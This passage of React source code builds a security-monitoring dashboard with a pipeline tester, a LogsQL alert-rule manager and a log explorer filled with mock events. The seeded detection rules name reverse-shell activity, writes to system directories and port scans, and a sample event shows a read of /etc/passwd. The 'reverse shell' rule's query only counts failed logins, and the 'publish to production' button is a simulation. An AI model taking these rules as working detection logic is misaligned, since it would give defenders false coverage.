                onChange={(e) => setInputJson(e.target.value)}
                rows={5}
                className="w-full bg-slate-950 border border-gray-805 rounded-xl p-3 font-mono text-[11px] text-slate-400 outline-none focus:border-blue-500"
              />
            </div>

            {/* Simulated output JSON */}
            <div className="space-y-1.5 relative">
              <label className="text-[10px] font-black uppercase text-slate-500">管道清洗結果預覽 (Parsed output JSON):</label>
              <div className="w-full h-[115px] bg-slate-950 border border-gray-805 rounded-xl p-3 font-mono text-[11px] text-emerald-400 overflow-y-auto custom-scrollbar">
                {outputJson ? (
                  <pre className="whitespace-pre-wrap leading-tight">{outputJson}</pre>
                ) : (
                  <span className="text-slate-600 block italic">等待執行測試運算...</span>
                )}
              </div>
            </div>
          </div>

          <div className="flex justify-between items-center bg-slate-950 p-2 border border-gray-850 rounded-lg">
            <button
              onClick={runVrlSim}
              className="py-1.5 px-4 bg-indigo-600 hover:bg-indigo-700 text-white rounded text-xs font-black uppercase tracking-widest transition"
            >
              ⚡ 執行管道測試 (Run Pipeline Test)
            </button>

            <button
              onClick={() => alert('VRL Rule propagated to production Vector config successfully.')}
              className="py-1.5 px-4 bg-rose-650 hover:bg-rose-700 text-white rounded text-xs font-black uppercase tracking-widest transition"
            >
              💾 發佈規則到全網
            </button>
          </div>

        </div>

      </div>
    </div>
  );
}

// 7. VICTORIALOGS RULES DEFINITION (SIEM DETECTION SETTINGS)
function VictoriaLogsRules() {
  const [showBuilder, setShowBuilder] = useState(false);
  const [rules, setRules] = useState([
    { id: 'rule-01', name: '惡意反彈 Shell 行為檢測', logsql: '_stream:security_events AND status: "failed_login" | stats count() by client_ip | filter count > 10', severity: 'High', checkTime: '每 5 分鐘', matchTimes: '12 次' },
    { id: 'rule-02', name: 'FIM 重要系統目錄寫入告警', logsql: '_stream:file_events AND action: "write" AND (path: "/etc/*" OR path: "C:\\Windows\\System32*")', severity: 'High', checkTime: '每 1 分鐘', matchTimes: '3 次' },
    { id: 'rule-03', name: '大量非預期 NMAP 掃描探查觸發', logsql: '_stream:flow_network_events AND dpt_count > 100 | filter action == "blocked"', severity: 'Medium', checkTime: '每 10 分鐘', matchTimes: '0 次' }
  ]);

  const [newRule, setNewRule] = useState({
    name: '',
    logsql: '',
    severity: 'High',
    checkTime: '每 5 分鐘',
    notifications: { webhook: true, slack: false, ui: true }
  });

  const handleAddNewRule = () => {
    if (!newRule.name || !newRule.logsql) return;
    const rTemp = {
      id: `rule-${Math.floor(Math.random() * 90) + 10}`,
      name: newRule.name,
      logsql: newRule.logsql,
      severity: newRule.severity,
      checkTime: newRule.checkTime,
      matchTimes: '0 次'
    };
    setRules([...rules, rTemp]);
    setShowBuilder(false);
    setNewRule({ name: '', logsql: '', severity: 'High', checkTime: '每 5 分鐘', notifications: { webhook: true, slack: false, ui: true } });
  };

  return (
    <div className="space-y-6">
      
      {/* Rule Controls header */}
      <div className="flex justify-between items-center bg-slate-900 border border-gray-850 p-4 rounded-xl">
        <div>
          <h3 className="text-xs font-black uppercase tracking-wider text-slate-200">VictoriaLogs 資安告警規則與通知設定 (SIEM Engine)</h3>
          <p className="text-[10px] text-slate-500 font-serif">Apply query logic filters on VictoriaLogs LogsQL schema to trigger alarm systems</p>
        </div>
        <button
          onClick={() => setShowBuilder(true)}
          className="py-1.5 px-3.5 bg-blue-600 hover:bg-blue-700 text-white rounded text-xs font-black uppercase tracking-widest flex items-center gap-1.5 transition"
        >
          <Plus className="w-4 h-4" /> 建立自定義告警
        </button>
      </div>

      {/* Rules list */}
      <div className="bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl">
        <div className="overflow-x-auto text-xs font-mono">
          <table className="w-full text-left divide-y divide-gray-800">
            <thead className="bg-[#0b0c13] text-slate-400 text-[9.5px] uppercase">
              <tr>
                <th className="p-3">啟用</th>
                <th className="p-3">規則名稱</th>
                <th className="p-3">LogsQL 條件配置</th>
                <th className="p-3">威脅等級</th>
                <th className="p-3">檢查頻率</th>
                <th className="p-3">觸發次數</th>
                <th className="p-3 text-right">管理</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800 bg-slate-900/40">
              {rules.map(rule => (
                <tr key={rule.id}>
                  <td className="p-3">
                    <label className="relative inline-flex items-center cursor-pointer">
                      <input type="checkbox" defaultChecked className="sr-only peer" />
                      <div className="w-8 h-4 bg-slate-950 border border-gray-800 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-gray-400 after:border-gray-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-blue-600 peer-checked:after:bg-white"></div>
                    </label>
                  </td>
                  <td className="p-3 text-slate-100 font-bold whitespace-nowrap">{rule.name}</td>
                  <td className="p-3 text-indigo-400 max-w-[280px] truncate" title={rule.logsql}>{rule.logsql}</td>
                  <td className="p-3">
                    <span className={cn(
                      "px-2 py-0.5 rounded text-[8.5px] font-black border",
                      rule.severity === 'High' ? "bg-rose-950/40 text-rose-400 border-rose-800/40" : "bg-amber-950/40 text-amber-500 border-amber-800/40"
                    )}>
                      {rule.severity}
                    </span>
                  </td>
                  <td className="p-3 text-slate-400">{rule.checkTime}</td>
                  <td className="p-3 text-rose-400 font-bold font-mono">{rule.matchTimes}</td>
                  <td className="p-3 text-right">
                    <button
                      onClick={() => setRules(prev => prev.filter(r => r.id !== rule.id))}
                      className="p-1.5 hover:bg-slate-950 text-slate-500 hover:text-rose-400 border border-transparent hover:border-gray-800 rounded transition"
                      title="撤銷策略規則"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Rule Builder Dialog Modal */}
      <AnimatePresence>
        {showBuilder && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div className="absolute inset-0 bg-black/80 backdrop-blur-xs" onClick={() => setShowBuilder(false)}></div>
            <div className="relative bg-[#0d0f19] border border-gray-800 rounded-xl w-full max-w-lg shadow-3xl text-xs space-y-4 p-6 text-slate-100">
              
              <div className="flex justify-between items-center border-b border-gray-800 pb-3">
                <span className="text-[10px] font-black uppercase text-indigo-400">Rule Creator</span>
                <h3 className="text-sm font-black text-white">建立資安監控與 LogsQL 告警規則</h3>
                <button onClick={() => setShowBuilder(false)} className="text-slate-500 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Form Input fields */}
              <div className="space-y-3 font-semibold">
                <div className="space-y-1">
                  <label className="text-slate-500 block uppercase font-bold text-[9px]">1. 規則命名 (Detection Name):</label>
                  <input
                    type="text"
                    required
                    placeholder="例如: WEB 網卡暴力破解爆發"
                    value={newRule.name}
                    onChange={(e) => setNewRule({ ...newRule, name: e.target.value })}
                    className="w-full bg-slate-950 border border-gray-800 rounded-xl px-4 py-2.5 text-slate-200 outline-none focus:border-blue-500"
                  />
                </div>

                <div className="space-y-1">
                  <label className="text-slate-500 block uppercase font-bold text-[9px]">2. 條件配置 (VictoriaLogs LogsQL 查詢語法):</label>
                  <textarea
                    rows={2}
                    required
                    placeholder='例如: _stream:auth | filter failed_login_attempts > 5'
                    value={newRule.logsql}
                    onChange={(e) => setNewRule({ ...newRule, logsql: e.target.value })}
                    className="w-full bg-slate-950 border border-gray-800 rounded-xl px-4 py-3 font-mono text-[11px] text-indigo-300 outline-none focus:border-blue-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <label className="text-slate-500 block uppercase font-bold text-[9px]">威脅嚴重度等級:</label>
                    <select
                      value={newRule.severity}
                      onChange={(e) => setNewRule({ ...newRule, severity: e.target.value })}
                      className="w-full bg-slate-950 border border-gray-800 rounded-xl px-3 py-2 text-slate-300 outline-none focus:border-blue-500"
                    >
                      <option>High</option>
                      <option>Medium</option>
                      <option>Low</option>
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="text-slate-500 block uppercase font-bold text-[9px]">自動評估頻率週期:</label>
                    <select
                      value={newRule.checkTime}
                      onChange={(e) => setNewRule({ ...newRule, checkTime: e.target.value })}
                      className="w-full bg-slate-950 border border-gray-800 rounded-xl px-3 py-2 text-slate-300 outline-none focus:border-blue-500"
                    >
                      <option>每 1 分鐘</option>
                      <option>每 5 分鐘</option>
                      <option>每 10 分鐘</option>
                      <option>每 1 小時</option>
                    </select>
                  </div>
                </div>

                {/* Notifications setup checklists */}
                <div className="bg-slate-950 p-3 rounded-lg border border-gray-850 space-y-2">
                  <span className="text-[10px] font-black uppercase text-slate-500 block">3. 觸發外部通知渠道:</span>
                  <div className="flex items-center gap-4 text-[11px]">
                    <label className="flex items-center gap-1.5 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={newRule.notifications.ui}
                        onChange={(e) => setNewRule({ ...newRule, notifications: { ...newRule.notifications, ui: e.target.checked } })}
                        className="rounded border-gray-800 text-blue-600 bg-transparent w-3.5 h-3.5 focus:ring-0"
                      />
                      <span>UI 即時彈出</span>
                    </label>

                    <label className="flex items-center gap-1.5 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={newRule.notifications.webhook}
                        onChange={(e) => setNewRule({ ...newRule, notifications: { ...newRule.notifications, webhook: e.target.checked } })}
                        className="rounded border-gray-800 text-blue-600 bg-transparent w-3.5 h-3.5 focus:ring-0"
                      />
                      <span>Webhook POST</span>
                    </label>

                    <label className="flex items-center gap-1.5 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={newRule.notifications.slack}
                        onChange={(e) => setNewRule({ ...newRule, notifications: { ...newRule.notifications, slack: e.target.checked } })}
                        className="rounded border-gray-800 text-blue-600 bg-transparent w-3.5 h-3.5 focus:ring-0"
                      />
                      <span>Slack Hook</span>
                    </label>
                  </div>
                </div>

              </div>

              {/* Actions */}
              <div className="pt-2 border-t border-gray-900 flex justify-end gap-2 text-[10.5px]">
                <button
                  type="button"
                  onClick={handleAddNewRule}
                  className="py-1.5 px-4 bg-blue-600 hover:bg-blue-700 text-white rounded font-black uppercase tracking-wider"
                >
                  確認建立
                </button>
                <button
                  type="button"
                  onClick={() => setShowBuilder(false)}
                  className="py-1.5 px-4 bg-slate-900 border border-gray-800 hover:bg-slate-800 text-slate-400 rounded text-center transition font-bold"
                >
                  關閉
                </button>
              </div>

            </div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}

// 8. KIBANA RAW LOGS DISCOVERY (THE ORIGINAL PRESERVED SEARCH COMPONENT)
function KibanaRawLogs() {
  const [searchQuery, setSearchQuery] = useState('');
  const [timeRange, setTimeRange] = useState('Last 15 minutes');
  const [isTimeDropdownOpen, setIsTimeDropdownOpen] = useState(false);
  const [customStart, setCustomStart] = useState('');
  const [customEnd, setCustomEnd] = useState('');
  const [selectedFields, setSelectedFields] = useState(['@timestamp', 'source', 'event', 'severity']);
  const [expandedRow, setExpandedRow] = useState<number | null>(null);
  const [filters, setFilters] = useState<{ field: string, value: string, type: 'include' | 'exclude' }[]>([
    { field: 'severity', value: 'High', type: 'include' }
  ]);

  const addFilter = (field: string, value: string, type: 'include' | 'exclude' = 'include') => {
    if (!filters.find(f => f.field === field && f.value === value && f.type === type)) {
      setFilters([...filters, { field, value, type }]);
    }
  };

  const removeFilter = (index: number) => {
    setFilters(filters.filter((_, i) => i !== index));
  };

  // Mock data for histogram
  const histogramData = Array.from({ length: 20 }, (_, i) => ({
    time: `${9}:${String(i).padStart(2, '0')}`,
    count: Math.floor(Math.random() * 50) + 10
  }));

  const events = [
    { id: 1, '@timestamp': '2026-04-02T09:07:01Z', source: 'SEMOR Flow', event: 'Suspicious outbound connection', severity: 'High', src_ip: '192.168.1.10', dst_ip: '8.8.8.8', action: 'Blocked', user: 'system', full_log: 'Apr  2 09:07:01 semor-sensor-01 kernel: [SEMOR-FILTER] OUTBOUND-DROP SRC=192.168.1.10 DST=8.8.8.8 PROTO=TCP SPT=44332 DPT=443' },
    { id: 2, '@timestamp': '2026-04-02T09:06:45Z', source: 'SEMOR Endpoint', event: 'Unauthorized file access', severity: 'Medium', user: 'jdoe', file: '/etc/passwd', action: 'Alerted', host: 'workstation-01', full_log: '{"timestamp":"2026-04-02T09:06:45Z","event_type":"file_integrity","host":"workstation-01","user":"jdoe","path":"/etc/passwd","action":"read","result":"denied"}' },
    { id: 3, '@timestamp': '2026-04-02T09:06:12Z', source: 'SEMOR Master', event: 'Admin login success', severity: 'Low', user: 'admin', ip: '10.0.0.5', action: 'Logged', location: 'Office-HQ', full_log: '2026-04-02 09:06:12 [AUTH] Admin user successfully logged in from 10.0.0.5 (Office-HQ) via Web UI' },
    { id: 4, '@timestamp': '2026-04-02T09:05:30Z', source: 'SEMOR Deception', event: 'Honeypot interaction detected', severity: 'Critical', src_ip: '45.33.22.11', service: 'SSH', action: 'Trapped', country: 'RU', full_log: 'INBOUND CONNECTION ATTEMPT: SRC=45.33.22.11 DST=HONEPOT-01 SERVICE=SSH(22) PAYLOAD="\\x05\\x01\\x00" RESULT=REDIRECTED' },
    { id: 5, '@timestamp': '2026-04-02T09:04:55Z', source: 'SEMOR Flow', event: 'Port scan detected', severity: 'Medium', src_ip: '172.16.0.55', ports: '1-1024', action: 'Rate-limited', full_log: 'TRAFFIC ALERT: Massive SYNC scan from 172.16.0.55 targeting common ports 1-1024. Rate limiting applied by SEMOR-IPS.' },
  ];

  const [customFields] = useState<string[]>(() => {
    const saved = localStorage.getItem('discovery_custom_fields');
    return saved ? JSON.parse(saved) : [];
  });

  const allFields = ['@timestamp', 'source', 'event', 'severity', 'user', 'src_ip', 'dst_ip', 'action', 'file', 'host', 'ip', 'location', 'service', 'country', 'ports', 'full_log', ...customFields];

  return (
    <div className="flex flex-col h-full gap-6">
      {/* Search & Filter Bar */}
      <div className="flex flex-col gap-4 bg-[#111114] border border-gray-800 rounded-xl p-4 shadow-2xl">
        <div className="flex gap-2">
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
            <input 
              type="text" 
              placeholder="檢索日誌欄位 (例如 raw_log.message: error AND severity: High...)"
              className="w-full bg-slate-950 border border-gray-800 rounded-lg py-2.5 pl-10 pr-4 text-xs focus:outline-none focus:border-blue-500 transition-all placeholder:text-gray-600 font-mono text-slate-300"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
          </div>
          <div className="relative">
            <button 
              onClick={() => setIsTimeDropdownOpen(!isTimeDropdownOpen)}
              className="flex items-center gap-2 px-4 py-2 bg-slate-950 hover:bg-slate-900 border border-gray-800 rounded-lg text-xs font-bold transition-all min-w-[160px] justify-between"
            >
              <div className="flex items-center gap-2">
                <Clock className="w-4 h-4 text-gray-400" />
                <span className="text-gray-300 font-medium">{timeRange}</span>
              </div>
              <ChevronDown className={cn("w-3 h-3 text-gray-500 transition-transform", isTimeDropdownOpen && "rotate-180")} />
            </button>

            <AnimatePresence>
              {isTimeDropdownOpen && (
                <>
                  <div 
                    className="fixed inset-0 z-40" 
                    onClick={() => setIsTimeDropdownOpen(false)} 
                  />
                  <motion.div
                    initial={{ opacity: 0, y: 10, scale: 0.95 }}
                    animate={{ opacity: 1, y: 0, scale: 1 }}
                    exit={{ opacity: 0, y: 10, scale: 0.95 }}
                    className="absolute right-0 mt-2 w-72 bg-[#16161a] border border-gray-800 rounded-xl shadow-2xl z-50 p-2 overflow-hidden text-xs"
                  >
                    <div className="grid grid-cols-2 gap-1 mb-2">
                      {[
                        'Last 15 minutes', 'Last 30 minutes', 'Last 1 hour', 
                        'Last 1 day', 'Last 7 days', 'This week', 
                        'Last 60 days', 'Last 90 days', 'Last 1 year'
                      ].map((range) => (
                        <button
                          key={range}
                          onClick={() => {
                            setTimeRange(range);
                            setIsTimeDropdownOpen(false);
                          }}
                          className={cn(
                            "text-left px-3 py-2 text-[11px] font-bold rounded-lg transition-colors",
                            timeRange === range ? "bg-blue-600 text-white" : "text-gray-400 hover:bg-gray-800 hover:text-white"
                          )}
                        >
                          {range}
                        </button>
                      ))}
                    </div>

                    <div className="border-t border-gray-800 pt-3 pb-1 px-2">
                      <div className="flex items-center gap-2 mb-2">
                        <Calendar size={12} className="text-gray-600" />
                        <span className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Custom Range</span>
                      </div>
                      <div className="space-y-2">
                        <div className="flex flex-col gap-1">
                          <label className="text-[8px] font-black text-gray-600 uppercase">Start Time</label>
                          <input 
                            type="datetime-local" 
                            className="w-full bg-gray-900 border border-gray-800 rounded p-1.5 text-xs text-gray-300 font-mono outline-none focus:border-blue-500"
                            value={customStart}
                            onChange={(e) => setCustomStart(e.target.value)}
                          />
                        </div>
                        <div className="flex flex-col gap-1">
                          <label className="text-[8px] font-black text-gray-600 uppercase">End Time</label>
                          <input 
                            type="datetime-local" 
                            className="w-full bg-gray-900 border border-gray-800 rounded p-1.5 text-xs text-gray-300 font-mono outline-none focus:border-blue-500"
                            value={customEnd}
                            onChange={(e) => setCustomEnd(e.target.value)}
                          />
                        </div>
                        <button 
                          disabled={!customStart || !customEnd}
                          onClick={() => {
                            setTimeRange(`${customStart} to ${customEnd}`);
                            setIsTimeDropdownOpen(false);
                          }}
                          className="w-full py-2 bg-blue-600 hover:bg-blue-700 disabled:opacity-30 disabled:hover:bg-blue-600 text-white rounded text-[10px] font-black uppercase tracking-widest transition-all"
                        >
                          Apply Custom Range
                        </button>
                      </div>
                    </div>
                  </motion.div>
                </>
              )}
            </AnimatePresence>
          </div>
          <button className="px-6 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-xs font-black uppercase tracking-wider transition-all shadow-lg shadow-blue-600/20">
            搜尋 (Search)
          </button>
        </div>
        
        <div className="flex items-center flex-wrap gap-2 min-h-[32px]">
          <div className="flex items-center gap-2 text-xs text-slate-500 mr-2">
            <Filter className="w-3.5 h-3.5" />
            <span className="font-bold uppercase tracking-wider text-[10.5px]">Filters:</span>
          </div>
          
          <AnimatePresence>
            {filters.map((filter, idx) => (
              <motion.div 
                key={`${filter.field}-${filter.value}-${idx}`}
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.8, opacity: 0 }}
                className={cn(
                  "flex items-center gap-1.5 px-2 py-1 rounded border text-[11px] font-mono transition-colors",
                  filter.type === 'include' 
                    ? "bg-blue-900/20 text-blue-400 border-blue-800/20" 
                    : "bg-rose-900/20 text-rose-400 border-rose-800/20"
                )}
              >
                <span className="opacity-60">{filter.field}:</span>
                <span>{filter.value}</span>
                <button 
                  onClick={() => removeFilter(idx)}
                  className="hover:bg-white/10 rounded-full p-0.5 transition-colors"
                >
                  <X className="w-3 h-3" />
                </button>
              </motion.div>
            ))}
          </AnimatePresence>
          
          {filters.length > 0 && (
            <button 
              onClick={() => setFilters([])}
              className="text-[10px] text-gray-500 hover:text-gray-300 transition-colors ml-2 underline underline-offset-2"
            >
              Clear all
            </button>
          )}
          
          <button className="text-[11px] text-blue-400 hover:text-blue-300 transition-colors flex items-center gap-1 ml-auto">
            <Plus className="w-3 h-3" /> Add filter
          </button>
        </div>
      </div>

      {/* Main split: Sidebar field list + Table */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 overflow-hidden">
        {/* Left Fields Column */}
        <div className="lg:col-span-3 bg-slate-900 border border-gray-800 rounded-xl p-4 flex flex-col gap-4">
          <div className="flex items-center justify-between border-b border-gray-800 pb-2">
            <span className="text-[10.5px] font-black uppercase tracking-widest text-slate-500">可檢索日誌欄位清單 (Fields)</span>
            <div className="flex gap-2">
              <Search className="w-3.5 h-3.5 text-gray-500 cursor-pointer hover:text-gray-400" />
              <Settings className="w-3.5 h-3.5 text-gray-500 cursor-pointer hover:text-gray-400" />
            </div>
          </div>
          
          <div className="space-y-4">
            <div>
              <span className="text-[9.5px] font-black uppercase text-slate-600 tracking-wider">Selected Fields</span>
              <div className="space-y-1.5 mt-1.5">
                {selectedFields.map(field => (
                  <div key={field} className="flex items-center justify-between px-2 py-1.5 bg-slate-950 rounded text-xs group">
                    <span className="text-blue-400 font-bold">{field}</span>
                    <button 
                      onClick={() => setSelectedFields(selectedFields.filter(f => f !== field))} 
                      className="text-slate-500 hover:text-rose-400 transition-colors"
                    >
                      <Minus size={11} />
                    </button>
                  </div>
                ))}
              </div>
            </div>

            <div>
              <span className="text-[9.5px] font-black uppercase text-slate-600 tracking-wider">Available Fields</span>
              <div className="space-y-1 mt-1.5 max-h-[220px] overflow-y-auto custom-scrollbar">
                {allFields.filter(f => !selectedFields.includes(f)).map(field => (
                  <div 
                    key={field} 
                    className="flex items-center justify-between px-2 py-1.5 hover:bg-slate-950 rounded text-xs cursor-pointer transition-colors" 
                    onClick={() => setSelectedFields([...selectedFields, field])}
                  >
                    <span className="text-slate-400">{field}</span>
                    <button className="text-slate-500 hover:text-blue-400">
                      <Plus size={11} />
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Right table / histogram column */}
        <div className="lg:col-span-9 space-y-4">
          
          {/* Chart Histogram */}
          <div className="bg-slate-900 border border-gray-800 rounded-xl p-4 shadow-xl">
            <div className="flex justify-between items-center text-xs mb-3">
              <span className="text-[10px] font-black uppercase tracking-wider text-slate-500">Log Occurrence Histogram (Hit Rate)</span>
              <div className="flex items-center gap-3">
                <span className="font-mono text-slate-400">1,245 hits</span>
                <span className="text-gray-700">|</span>
                <button className="flex items-center gap-1 hover:text-blue-400 text-slate-400 transition-colors">
                  <Download className="w-3 h-3" /> Export
                </button>
                <button className="flex items-center gap-1 hover:text-blue-400 text-slate-400 transition-colors">
                  <Share2 className="w-3 h-3" /> Share
                </button>
              </div>
            </div>
            
            <div className="h-32">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={histogramData}>
                  <XAxis dataKey="time" stroke="#4b5563" fontSize={10} tickLine={false} />
                  <YAxis stroke="#4b5563" fontSize={10} tickLine={false} />
                  <Tooltip contentStyle={{ backgroundColor: '#000', border: '1px solid #374151', borderRadius: '8px' }} />
                  <Bar dataKey="count" fill="#3b82f6" radius={[2, 2, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Records Table */}
          <div className="bg-[#0b0c13] border border-gray-800 rounded-xl overflow-hidden shadow-2xl">
            <div className="overflow-x-auto text-[11.5px] font-mono leading-normal">
              <table className="w-full text-left divide-y divide-gray-800/80 border-collapse">
                <thead className="bg-[#121320] text-slate-400 text-[9.5px] uppercase sticky top-0 z-10">
                  <tr>
                    <th className="p-3 w-8"></th>
                    {selectedFields.map(field => (
                      <th key={field} className="p-3 font-bold">{field}</th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-850 bg-slate-900/30">
                  {events.map((evt, idx) => (
                    <React.Fragment key={evt.id}>
                      <tr
                        onClick={() => setExpandedRow(expandedRow === idx ? null : idx)}
                        className={cn(
                          "hover:bg-slate-900/60 cursor-pointer transition-colors",
                          expandedRow === idx && "bg-slate-900/80"
                        )}
                      >
                        <td className="p-3 text-center text-slate-500">
                          <ChevronRight className={cn("w-4 h-4 transition-transform", expandedRow === idx && "rotate-90 text-blue-400")} />
                        </td>
                        {selectedFields.map(f => (
                          <td key={f} className="p-3">
                            {f === 'severity' ? (
                              <span className={cn(
                                "px-2 py-0.5 rounded text-[8.5px] font-black border uppercase tracking-wider",
                                evt.severity === 'Critical' ? "bg-rose-950/40 text-rose-400 border-rose-800/40" :
                                evt.severity === 'High' ? "bg-orange-950/40 text-orange-400 border-orange-800/40" :
                                evt.severity === 'Medium' ? "bg-yellow-950/30 text-yellow-500 border-yellow-800/30" :
                                "bg-blue-950/30 text-blue-400 border-blue-800/30"
                              )}>
                                {evt.severity}
                              </span>
                            ) : (
                              <span className="text-slate-300 block truncate max-w-[200px]" title={String(evt[f as keyof typeof evt] || '')}>
                                {String(evt[f as keyof typeof evt] || '-')}
                              </span>
                            )}
                          </td>
                        ))}
                      </tr>

                      {/* Expanded Row Item */}
                      <AnimatePresence>
                        {expandedRow === idx && (
                          <tr>
                            <td colSpan={selectedFields.length + 1} className="bg-slate-950/60 p-5">
                              <motion.div 
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: 'auto', opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                className="overflow-hidden"
                              >
                                <div className="border border-gray-850 rounded-xl p-5 bg-slate-950 space-y-4">
                                  <div className="flex items-center justify-between border-b border-gray-900 pb-1.5">
                                    <span className="text-[10px] font-black uppercase text-indigo-400">Document Key-Value Details (Expanded)</span>
                                    <div className="flex gap-2 text-[10px]">
                                      <button className="text-blue-400 hover:underline">Table View</button>
                                      <span className="text-gray-700">|</span>
                                      <button className="text-gray-500 hover:underline">JSON View</button>
                                    </div>
                                  </div>
                                  
                                  <div className="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-2 text-[11px] font-mono">
                                    {Object.entries(evt).filter(([k]) => k !== 'full_log').map(([k, v]) => (
                                      <div key={k} className="flex gap-2 group/prop py-0.5">
                                        <div className="w-28 shrink-0 flex gap-1 items-center">
                                          <div className="flex opacity-0 group-hover/prop:opacity-100 transition-opacity gap-0.5 mr-1">
                                            <button 
                                              onClick={() => addFilter(k, String(v), 'include')} 
                                              className="text-blue-400 hover:bg-blue-900/30 p-0.5 rounded"
                                              title="Filter for this value"
                                            >
                                              <Plus size={8} />
                                            </button>
                                            <button 
                                              onClick={() => addFilter(k, String(v), 'exclude')} 
                                              className="text-rose-400 hover:bg-rose-900/30 p-0.5 rounded"
                                              title="Exclude this value"
                                            >
                                              <Minus size={8} />
                                            </button>
                                          </div>
                                          <span className="text-slate-500 font-bold">{k}:</span>
                                        </div>
                                        <span className="text-slate-300 break-all">{String(v)}</span>
                                      </div>
                                    ))}
                                  </div>

                                  {/* Contextual Actions & AI Insight Rows */}
                                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t border-gray-900">
                                    <div className="space-y-2">
                                      <span className="text-[9px] uppercase tracking-wider text-slate-500 block">Contextual Actions</span>
                                      <div className="grid grid-cols-2 gap-2 text-[10.5px]">
                                        <button className="flex items-center gap-2 px-3 py-2 bg-slate-900 hover:bg-slate-800 border border-gray-800 rounded-lg text-slate-300 hover:text-white transition-colors">
                                          <Shield className="w-3.5 h-3.5 text-blue-400" />
                                          <span>Create Alert Rule</span>
                                        </button>
                                        <button className="flex items-center gap-2 px-3 py-2 bg-slate-900 hover:bg-slate-800 border border-gray-800 rounded-lg text-slate-300 hover:text-white transition-colors">
                                          <Zap className="w-3.5 h-3.5 text-yellow-400" />
                                          <span>Trigger Playbook</span>
                                        </button>
                                        <button className="flex items-center gap-2 px-3 py-2 bg-slate-900 hover:bg-slate-800 border border-gray-800 rounded-lg text-slate-300 hover:text-white transition-colors">
                                          <Terminal className="w-3.5 h-3.5 text-green-400" />
                                          <span>Remote Forensic</span>
                                        </button>
                                        <button className="flex items-center gap-2 px-3 py-2 bg-slate-900 hover:bg-slate-800 border border-gray-800 rounded-lg text-slate-300 hover:text-white transition-colors">
                                          <Globe className="w-3.5 h-3.5 text-purple-400" />
                                          <span>Whois Lookup</span>
                                        </button>
                                      </div>
                                    </div>
                                    
                                    <div className="space-y-2">
                                      <span className="text-[9px] uppercase tracking-wider text-slate-500 block">Recommended AI Insight</span>
                                      <div className="p-3 bg-blue-600/5 border border-blue-600/10 rounded-xl space-y-1.5 flex gap-2.5 items-start">
                                        <Brain className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                                        <p className="text-[11px] text-slate-400 leading-normal italic">
                                          "This event matches patterns of a known lateral movement technique. Recommended action: Isolate host workstation-01 and verify user jdoe's recent activity."
                                        </p>
                                      </div>
                                    </div>
                                  </div>

                                  {/* Live Log */}
                                  {evt.full_log && (
                                    <div className="space-y-1 bg-[#0b0c13] p-3 rounded-lg border border-gray-800/50">
                                      <span className="text-[9px] uppercase tracking-wider text-slate-500 block">syslog raw message text</span>
                                      <p className="text-[11.5px] leading-relaxed text-slate-300 whitespace-pre-wrap break-all">{evt.full_log}</p>
                                    </div>
                                  )}
                                </div>
                              </motion.div>
                            </td>
                          </tr>
                        )}
                      </AnimatePresence>
                    </React.Fragment>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Pagination footer */}
            <div className="p-3 bg-slate-950/80 backdrop-blur-sm border-t border-gray-850 flex items-center justify-between text-xs text-slate-500 font-mono">
              <div className="flex items-center gap-4">
                <span>Showing 1 - 5 of 1,245 events</span>
                <div className="flex items-center gap-2">
                  <span className="text-[9px] uppercase font-bold text-slate-600">Page Size:</span>
                  <select className="bg-slate-900 border border-gray-800 rounded px-1.5 py-0.5 text-[10px] outline-none text-slate-400">
                    <option>5</option>
                    <option>10</option>
                    <option>25</option>
                    <option>50</option>
                  </select>
                </div>
              </div>
              <div className="flex gap-2">
                <button className="px-3 py-1 bg-slate-900 border border-gray-800 rounded hover:bg-slate-850 text-slate-400 disabled:opacity-30 disabled:cursor-not-allowed transition-colors" disabled>
                  Previous
                </button>
                <button className="px-3 py-1 bg-slate-900 border border-gray-800 rounded hover:bg-slate-850 text-slate-300 transition-colors">
                  Next
                </button>
              </div>
            </div>
          </div>

        </div>
      </div>

    </div>
  );
}
